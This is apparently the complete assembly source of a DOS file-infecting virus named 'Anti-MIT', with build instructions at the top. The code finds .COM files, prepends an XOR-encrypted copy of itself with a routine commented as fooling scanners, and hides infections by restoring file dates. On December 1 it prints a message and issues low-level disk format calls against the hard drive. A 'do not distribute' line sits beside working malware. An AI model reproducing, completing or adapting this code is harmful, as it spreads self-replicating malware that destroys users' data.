;                          **  Anti-MIT Virus **
;       To assemble, use TASM and TLINK to create a .COM file. Next
;    run the .COM file in the same directory of a file you want to infect.
;    Your system may hang, but after re-booting you will notice an increase
;    in the target files size. Now debug the newly infected file and replace
;    the first three bytes with E8 05 00 (call to encryption). Re-write the
;    .COM file and now you should have a running copy of the Anti-Mit virus!
;
;                 - Do not distribute the Anti-MIT virus for this
;                 activity is against the law! The author will take
;                 NO responsiblity for others.
;                                 TEST ONLY
;
;                        For more info see MIT.DOX file.




name    AntiMIT
	title   Anti-MIT: The original Anti-MIT virus code! 
	.radix  16
code    segment
	assume  cs:code,ds:code
	org     100

buffer  equ     offset 20000d                 ; Buffer
fname   equ     offset 20000d + 1eh           ; DTA - File name
ftime   equ     offset 20000d + 16h           ; DTA - File time
fsize   equ     offset 20000d + 1ah           ; DTA - File size
olddta  equ     80                            ; Old DTA area

start:
	jmp     main                          ; *See above*
	nop
	jmp     main                          ; Jmp to virus body

encrypt_val     db      0                     ; Randomized encryption value

decrypt:                                      ; Encrypt/decrypt engine
encrypt:                                      ; [SKISM type]
     lea        si, data
     mov        ah, encrypt_val
     jmp        fool_em                       ; Fool with the scanners

xor_loop:
     lodsb                                    ; ds:[si] -> al
     xor     al, ah
     stosb                                    ; al -> es:[di]
     loop    xor_loop
     mov     ah,19h                           ; Set current drive as default
     int     21h
     mov     dh,al
     mov     ah,0eh
     int     21h
     ret                

fool_em:
     mov        di, si
     mov        cx, stop_encrypt - data
     jmp        xor_loop



data            label   byte                  ; Virus data
message         db      'MIT Sux! $'          ; The "message"
lengthp         dw      ?                     ; Length of infected file
allcom          db      '*.COM',0             ; What to search for
virus           db      '[Anti-MIT]',0        ; Virus name
author          db      'FårsÿStråk‰',0       ; Author

main:                                         ; Main virus code
	mov     ah,2ah                        ; Get the date
	int     21h
	 
	cmp     dh,12d                        ; Month 12?
	jnz     next                          ; No
	
	 
	cmp     dl,01d                        ; Day one?
	jnz     next                          ; No
	lea     dx,message                    ; Yes, set off the "bomb"
	mov     ah,09h
	int     21h

	mov     ah,05h
	mov     al,02h
	mov     ch,00h
	mov     dh,00h
	mov     dl,80h
	int     13h

	mov     ah,06h
	int     13h

	mov     ah,05h
	mov     dl,00h
	int     13h

	mov     ah,4ch                        ; Exit
	int     21h

next:
	mov     cx,lengthp                    ; Figure out the Jmp 
	sub     cx,eendcode-start
	mov     the_jmp,cx

	


	push    es                            ; Save ES
	mov     ax,3524h                      ; Get interrupt 24h handler
	int     21h                           ; and save it in errhnd
	mov     [err1],bx
	mov     [err2],es
	pop     es                            ; Restore ES

	mov     ax,2524h                      ; Set interrupt 24h handler
	lea     dx,handler
	int     21h

	xor     dx,dx                         ; Set DTA in "buffer" area
	mov     si,dx
	mov     dx,buffer
	add     dx,si                         ; Set new Disk Transfer Address
	mov     ah,1A                         ; Set DTA
	int     21


find_first:
	mov     dx,offset allcom              ; Search for '*.COM' files
	mov     cx,00000001b                  ; Normal, Write Protected
	mov     ah,4E                         ; Find First file
	int     21
	jc      pre_done                      ; Quit if none found
	jmp     check_if_ill
	   
mover:                                        ; The "mover" code
	push    cs                            ; Store CS
	pop     es                            ; and move it to ES
	mov     di,0100h                      
	lea     si,eendcode                   ; Move original code to 
	add     si,the_jmp                    ; beginning
	add     si,endcode-mover
	mov     cx,eendcode-start
	rep     movsb
	mov     di,0100h                      ; Jmp to CS:[100h]
	jmp     di

pre_done:
	jmp     done                          ; Long jmp

find_next:
	mov     ah,4fh                        ; Search for next
	int     21h
	jc      pre_done

check_if_ill:                                 ; File infected?
	mov     ax,cs:[ftime]
	and     al,11111b                     ; Look for the 62 sec marker
	cmp     al,62d/2                      ; [Vienna type]
	jz      find_next

	cmp     cs:[fsize],19000d             ; Check if file larger then 
	ja      find_next                     ; 19000 bytes - if so skip

	cmp     cs:[fsize],500d               ; Check if file smaller then
	jb      find_next                     ; 500 bytes - if so skip


mainlp:                                       ; Write the virus
	mov     dx,fname
	mov     ah,43h                        ; Write enable
	mov     al,0
	int     21h
	mov     ah,43h
	mov     al,01h
	and     cx,11111110b
	int     21h

	
	mov     ax,3d02h                      ; Open file (read/write)
	int     21h
	jc      pre_done
	mov     bx,ax

	mov     ax,5700h                      ; Get date for file
	int     21h
	mov     [time],cx                       ; Save date info
	mov     [date],dx

	mov     ah,3fh                        ; Read original code into 
	mov     dx,buffer                     ; buffer (length of virus)
	mov     cx,eendcode-start
	int     21h
	jc      pre_done
	cmp     ax,eendcode-start
	jne     pre_done


	mov     ah,42h                        ; Go to end of file
	mov     al,02h
	xor     cx,cx
	xor     dx,dx
	int     21h
	jc      pre_done
	mov     cx,ax
	mov     lengthp,ax                    ; Save original program code

	mov     ah,40h                        ; Write "mover" code to end   
	lea     dx,mover                      ; of file
	mov     cx,endcode-mover
	int     21h
	jc      done
	cmp     ax,endcode-mover
	jne     done

	mov     ah,40h                        ; Write original program code 
	mov     dx,buffer                     ; to end of the file
	mov     cx,eendcode-start
	int     21h
	jc      done
	cmp     ax,eendcode-start
	jne     done

	mov     ah,42h                        ; Go to front of file
	mov     al,00h
	xor     cx,cx
	xor     dx,dx
	int     21h
	jc      done
	
stop_encrypt:
	mov     ah,2ch                        ; Get time
	int     21h                           
	
	mov     encrypt_val,dh                ; Use time as random encryption
	call    encrypt                       ; value
	
	mov     ah,40h                        ; Write virus code to front of
	lea     dx,start                      ; file
	mov     cx,eendcode-start
	int     21h
	jc      done
	cmp     ax,eendcode-start
	jne     done
	jmp     date_stuff

handler:
	mov     al,0
	iret
endp


time    dw      ?                             ; File stamp - time
date    dw      ?                             ; File stamp - date
err1    dw      ?                             ; Original error handler 
err2    dw      ?                             ; address

date_stuff:                                   ; Restore old file stamp
	mov     ax,5701h       
	mov     cx,[time]
	mov     dx,[date]
	and     cl,not 11111b                 ; Set seconds field to 62 secs.
	or      cl,11111b
	int     21h
	mov     ah,3eh
	int     21h
	mov     dx,olddta                     ; Restore "original" DTA
	mov     ah,1ah
	int     21h

	push    ds                            ; Save DS
	mov     ax,2524h                      ; Set interrupt 24h handler
	mov     dx,err1                       ; Restore saved handler
	mov     dx,err2
	mov     ds,dx
	int     21h
	pop     ds                            ; Restore DS

done:
	xor     cx,cx                         ; Clear registors
	xor     dx,dx
	xor     bx,bx
	xor     ax,ax
	xor     si,si
jmp_code db     0e9h                          ; Preform jmp to "mover" code
the_jmp  dw     ?

go:
eendcode        label          byte

	nop                                   ; krap
	nop
	nop
	nop
	nop




endcode         label          byte












code    ends
	end     start
